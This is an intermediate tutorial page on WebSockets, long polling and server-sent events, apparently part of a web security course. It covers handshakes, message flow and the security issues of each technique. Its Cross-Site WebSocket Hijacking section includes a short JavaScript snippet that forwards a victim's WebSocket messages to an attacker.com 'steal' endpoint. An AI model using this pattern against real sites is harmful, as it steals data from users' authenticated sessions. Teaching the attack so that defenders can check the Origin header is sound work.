---
title: "WebSockets, Long Polling, and SSE"
topic: "websockets-sse"
tags: [websockets, long-polling, sse, server-sent-events, http, real-time, web]
difficulty: intermediate
day: 37
layout: default
parent: Topics
nav_order: 37
---

# WebSockets, Long Polling, and SSE

## What You Will Learn
- How WebSockets work and why they are different from HTTP
- What Long Polling is and when it is used
- What Server-Sent Events (SSE) are and how they work
- Security issues specific to each technology

## What Is It?

Traditional HTTP is **request-response** — the client asks, the server answers, then the connection closes. But some applications need **real-time** updates: chat apps, live dashboards, stock tickers. Three main techniques solve this problem: WebSockets, Long Polling, and Server-Sent Events (SSE).

## Why It Matters

Each technology has unique security considerations. WebSocket connections bypass some browser protections. Real-time endpoints are often undertested compared to REST APIs.

## Key Concepts

## WebSockets

WebSockets open a **bidirectional TCP connection** between client and server. Both sides can send and receive messages at any time. The communication is bidirectional and stateful.

### WebSocket Handshake

The connection starts as HTTP, then upgrades:

```http
GET /chat HTTP/1.1
Host: example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
```

Server response:

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

### WebSocket Security Issues

- **No automatic CSRF protection**: WebSocket handshakes send cookies but do not require a CSRF token
- **Cross-Site WebSocket Hijacking (CSWSH)**: If the server does not validate the `Origin` header, an attacker can initiate a WebSocket from a malicious site
- **Lack of authentication**: WebSocket messages after the handshake have no built-in auth

```js
// Attacker page exploiting CSWSH
var ws = new WebSocket('wss://victim.com/chat');
ws.onmessage = function(evt) {
    fetch('https://attacker.com/steal?data=' + encodeURIComponent(evt.data));
};
```

## Long Polling

Long polling keeps a server-to-client connection open as long as possible. The server holds the request and only responds when new data is available or a timeout is reached. This is different from WebSockets — in long polling, only responses to requests are sent, not arbitrary messages.

```
Client                          Server
  |------ GET /updates -------->|
  |                              |  (holds connection)
  |                              |  (new data arrives)
  |<------ 200 + data ----------|
  |------ GET /updates -------->|  (immediately re-polls)
```

## Server-Sent Events (SSE)

SSE is a **one-way** channel from server to client. The server pushes updates, but the client cannot send messages back over the same connection. It uses standard HTTP and works natively in browsers.

```http
GET /events HTTP/1.1
Accept: text/event-stream
```

Server sends:

```
Content-Type: text/event-stream

data: {"price": 100}

data: {"price": 102}
```

### SSE in JavaScript

```js
const es = new EventSource('/events');
es.onmessage = function(evt) {
    console.log('Update:', evt.data);
};
```

### Comparison Table

| Feature | WebSockets | Long Polling | SSE |
|---------|-----------|-------------|-----|
| Direction | Bidirectional | Server to client | Server to client |
| Protocol | WS/WSS | HTTP | HTTP |
| Browser support | All modern | All | All (not IE) |
| Reconnect | Manual | Manual | Automatic |
| Security | Needs origin check | Standard HTTP | Standard HTTP |

## Resources

- [PortSwigger — WebSocket Security](https://portswigger.net/web-security/websockets)
- [MDN — WebSockets API](https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API)
- [MDN — Server-Sent Events](https://developer.mozilla.org/en-US/docs/Web/API/Server-sent_events)
- [TryHackMe — WebSocket Security](https://tryhackme.com/)
